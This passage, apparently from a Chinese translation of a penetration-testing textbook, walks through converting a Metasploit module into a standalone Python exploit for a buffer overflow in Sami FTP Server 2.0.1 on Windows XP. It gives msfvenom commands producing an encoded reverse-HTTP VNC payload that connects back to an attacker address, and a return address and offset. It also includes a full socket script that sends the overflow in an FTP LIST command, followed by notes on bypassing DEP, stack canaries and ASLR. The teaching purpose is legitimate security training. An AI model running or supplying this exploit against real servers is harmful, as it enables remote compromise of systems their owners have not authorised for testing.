msfvenom -p windows/vncinject/reverse_http lhost=192.168.195.172 lport=443 -b '\x00\x0a\x0d\x20\x5c' -f raw -o payload

```

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_46.jpg)

我们验证了使用`hexdump`命令生成的有效负载。

```py
hexdump -C payload

```

下图显示了有效负载的输出：

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_47.jpg)

为了结合堆栈调整代码和实际有效负载，我们可以使用下图中突出显示的方法，显示了这个命令的简单性：

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_48.jpg)

执行后，我们验证了两个组件的组合，如您所见，调整的十六进制代码被放置在 shellcode 的前面。

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_49.jpg)

现在，将数据编码为脚本可用的格式，删除我们通常知道会破坏漏洞的不良字符。

```py
cat shellcode |msfvenom -b "\x00\xff\x01\x09\x0a\x0d" -e x86/shikata_ga_nai -f c --arch x86 --platform win

```

生成的输出是实际用于此漏洞利用的 shellcode：

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_50.jpg)

现在，我们可以开始使用 Metasploit 模块中的所有功能来构建我们的漏洞利用。我们将使用目标代码来提取`Offset`和`Ret`数据。`Ret`保存 EIP 的返回地址，`Offset`提供了调整 shellcode 放置位置所需的数据。

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_51.jpg)

生成我们的漏洞利用的返回地址组件非常简单。

```py
eip = struct.pack('<I',0x10028283)
```

设置偏移量可能因模块而异，您可能需要进行额外的数学运算来获得正确的值。因此，始终查看实际的漏洞利用代码，如下所示：

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_52.jpg)

我们看到偏移量的长度减去了 IP 地址的大小。这创建了一个更新的偏移值。

```py
offset = 228 - len(lhost)
```

我们可以看到生成了随机文本的垃圾数据。因此，我们可以以类似的方式生成我们的 NOPs。

```py
nop = "\x90" *16
```

接下来，我们需要创建注入漏洞代码的操作顺序。

```py
exploit = offset + eip + nop + shell
```

如您所见，使用前面章节中的知识一切都非常简单。最后一个组件是设置处理程序与 FTP 服务进行交互。

```py
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((rhost, rport))
print(client.recv(1024))
client.send("USER " + username + "\r\n")
print(client.recv(1024))
client.send("PASS "password + "\r\n")
print(client.recv(1024))
print("[*] Sending exploit")
client.send("LIST" + exploit + "\r\n")
print(client.recv(1024))
client.close()
```

最终结果是一个可以测试并运行在实际服务器上的 Python 漏洞利用。这为测试提供了一个很好的起点。如果发现 Metasploit 模块不完美，将其逆向创建一个独立的模块，可以帮助您排除可能的问题。

请记住，漏洞利用有一个可靠性评级系统。如果漏洞利用的可靠性评级较低，意味着它可能无法始终产生期望的结果。这为您提供了尝试改进实际 Metasploit 模块并为社区做出贡献的机会。例如，这个漏洞利用的评级是低的；考虑测试并尝试改进它。

```py
import sys, socket, strut
rhost = "192.168.195.159"
lhost = "192.168.195.172"
rport = 21
password = "badpassword@hacku.com"
username = "anonymous"
eip = struct.pack('<I',0x10028283)
offset = 228 - len(lhost)
nop  = "\x90" *16
shell =() #Shellcode was not inserted to save space
exploit = offset + eip + nop + shell
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((rhost, rport))
print(client.recv(1024))
client.send("USER " + username + "\r\n")
print(client.recv(1024))
client.send("PASS "password + "\r\n")
print(client.recv(1024))
print("[*] Sending exploit")
client.send("LIST" + exploit + "\r\n")
print(client.recv(1024))
client.close()
print("[*] Sent exploit to %s on port %s") % (rhost,rport)
```

现在，这个特定的漏洞利用是为 Windows XP SP 3 开发的。您现在可以使用这段代码来尝试并针对不同的平台。独立的 Python 漏洞利用意味着您有必要的能力来扩展漏洞利用。然后，您可以将额外的目标添加到 Metasploit 模块中。这可以通过修改模块的以下部分来实现。

![反向工程 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_53.jpg)

以下是实际模块中的代码如何更新以包含其他相关目标的方式：

```py
'Targets'        =>
        [
          [ 'Sami FTP Server 2.0.1 / Windows XP SP 3',   { 'Ret' => 0x10028283, 'Offset' => 228 } ],
          [ 'New Definition', { 'Ret' => 0x#######, 'Offset' => ### } ],
```

通过这个例子，我们看到了如何反向工程 Metasploit 模块以创建一个独立的漏洞利用，这可以用来扩展目标选择并提高未来漏洞利用的可靠性。

### 注意

如果您选择创建新的 Metasploit 模块或具有不同功能的更新，并且不想破坏当前的安装，您可以将自定义模块加载到 Metasploit 中。这些细节在以下位置有很好的文档记录[`github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules`](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)。

# 理解保护机制

有一整本书专门介绍了一些供管理员和开发人员使用的工具，这些工具可以防止许多漏洞利用。它们包括**数据执行防护**（**DEP**），如果代码和操作系统配置为利用它，它将阻止像我们这样的代码运行。这是通过阻止在堆栈上执行数据来实现的。我们可以通过简单地覆盖**结构化异常处理**（**SEH**）来绕过 DEP，以运行我们自己的代码。

栈金丝雀是栈中的数学构造，检查返回指针何时被调用。如果值发生了变化，那么出现了问题，并引发了异常。如果攻击者确定了守卫正在检查的值，它可以被注入到 shellcode 中以防止异常。

最后，还有**地址空间层随机化**（**ASLR**），它随机化了我们利用的内存位置。ASLR 比其他两种方式更难打败，但它基本上是通过在内存中构建具有维持一致内存位置的共享库组件的漏洞利用来打败的。没有这些一致的共享库，操作系统将无法执行基本的进程。这种技术被称为**返回导向编程**（**ROP**）链接。

# 摘要

在本章中，我们概述了 Windows 内存结构以及我们如何利用糟糕的编码实践。然后，我们强调了如何使用 Python 代码生成自己的漏洞利用，使用有针对性的测试和概念验证代码。本章最后介绍了如何反向工程 Metasploit 模块以创建独立的漏洞利用，以改进当前模块的功能或生成新的漏洞利用。在下一章中，我们将介绍如何自动报告渗透测试期间发现的细节以及如何解析**可扩展标记语言**（**XML**）。
